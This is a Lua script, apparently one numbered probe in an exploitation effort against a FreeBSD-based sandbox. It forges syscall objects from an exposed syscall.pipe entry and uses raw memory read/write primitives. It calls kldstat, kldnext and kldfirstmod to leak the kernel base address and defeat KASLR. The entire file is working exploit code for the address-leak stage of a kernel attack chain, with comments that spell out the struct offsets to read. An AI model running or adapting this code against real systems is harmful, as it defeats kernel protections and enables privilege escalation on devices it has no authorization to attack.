-- CRASH_CLASS: MODERATE (probing kldstat with safe struct)
-- PROBE 43a: kldstat via make_syscall — KASLR defeat
--
-- FreeBSD standard kldstat syscall is 308 (306 is kldfind, 307 is kldnext).
-- Probe 02 mapped 367 in its resolve table. This probe tests BOTH 308 and 367.
--
-- kldstat returns struct kld_file_stat which contains:
--   int      version   (+0x00, set to sizeof(struct kld_file_stat))
--   char     name[64]  (+0x04)
--   int      refs      (+0x44)
--   int      id        (+0x48)
--   void*    address   (+0x50) *** KERNEL BASE ADDRESS ***
--   size_t   size      (+0x58)
--
-- fileid 1 = the kernel itself. If address field leaks, KASLR is dead.

print("=== PROBE 43a: KLDSTAT KASLR DEFEAT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) kldstat — kernel module info
-- int kldstat(int fileid, struct kld_file_stat *stat)
-- Note: Standard FreeBSD syscall number is 308. Sweep 02 mapped 367.
-- We test both 308 and 367 to ensure coverage.
--------------------------------------------------------------------
print("")
print("=== A: KLDSTAT (testing syscalls 308 and 367) ===")
do
    local stat_buf = memory.alloc(0x100)

    for _, sc_num in ipairs({308, 367}) do
        print(string.format("--- Testing kldstat as syscall %d ---", sc_num))
        local sc_kldstat = make_syscall(sc_num)

        for fileid = 1, 3 do
            for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
            safe_wd(stat_buf, 0x70) -- 112 bytes

            local ok, ret = pcall(function()
                return sc_kldstat(uint64(fileid), uint64(stat_buf))
            end)
            local rv = ok and to_num(ret) or -999
            print(string.format("  fileid=%d (sc=%d): ret=%d", fileid, sc_num, rv))

            if rv == 0 then
                local version = safe_rd(stat_buf)
                print(string.format("    version: %d", version or -1))

                local name = ""
                for i = 0, 63 do
                    local b = safe_rb(stat_buf + 4 + i)
                    if b and b > 0 and b < 128 then
                        name = name .. string.char(b)
                    else
                        break
                    end
                end
                print("    name: " .. name)

                local refs = safe_rd(stat_buf + 0x44)
                print(string.format("    refs: %d", refs or -1))

                local id = safe_rd(stat_buf + 0x48)
                print(string.format("    id: %d", id or -1))

                local addr = safe_rq(stat_buf + 0x50)
                if addr then
                    local h, l = get_hi_lo(addr)
                    print(string.format("    address: %08X_%08X", h, l))
                    if h >= 0xFFFF8000 then
                        print("    *** KERNEL ADDRESS LEAKED — KASLR DEFEATED ***")
                    end
                end

                local sz = safe_rq(stat_buf + 0x58)
                if sz then
                    local sh, sl = get_hi_lo(sz)
                    print(string.format("    size: %08X_%08X", sh, sl))
                end
            end
        end

        -- Also try with version = 120 (0x78)
        for off = 0, 0xFC, 4 do safe_wd(stat_buf + off, 0) end
        safe_wd(stat_buf, 0x78)
        local ok2, ret2 = pcall(function()
            return sc_kldstat(uint64(1), uint64(stat_buf))
        end)
        local rv2 = ok2 and to_num(ret2) or -999
        print(string.format("  fileid=1 version=120 (sc=%d): ret=%d", sc_num, rv2))
        if rv2 == 0 then
            local addr = safe_rq(stat_buf + 0x50)
            if addr then
                local h, l = get_hi_lo(addr)
                print(string.format("    address: %08X_%08X", h, l))
            end
        end
    end
end

--------------------------------------------------------------------
-- B) kldnext(0) — get first module fileid, then enumerate
-- int kldnext(int fileid) — returns next fileid, 0 = end
--------------------------------------------------------------------
print("")
print("=== B: KLDNEXT (syscall 307) ===")
do
    local sc_kldnext = make_syscall(307)
    local fileid = 0
    local count = 0
    repeat
        local ok, ret = pcall(function()
            return sc_kldnext(uint64(fileid))
        end)
        local rv = ok and to_num(ret) or -999
        if rv <= 0 or rv == 0xFFFFFFFF then
            print(string.format("  kldnext(%d) = %d (end/error)", fileid, rv))
            break
        end
        print(string.format("  kldnext(%d) = %d", fileid, rv))
        fileid = rv
        count = count + 1
    until count > 20
    print("  modules found: " .. count)
end

--------------------------------------------------------------------
-- C) kldfirstmod — get first module in a kld file
-- int kldfirstmod(int fileid) — returns modid
--------------------------------------------------------------------
print("")
print("=== C: KLDFIRSTMOD (syscall 309) ===")
do
    local sc_kldfirstmod = make_syscall(309)
    local ok, ret = pcall(function()
        return sc_kldfirstmod(uint64(1))
    end)
    local rv = ok and to_num(ret) or -999
    print(string.format("  kldfirstmod(1) = %d", rv))
end

print("")
print("=== PROBE 43a COMPLETE ===")
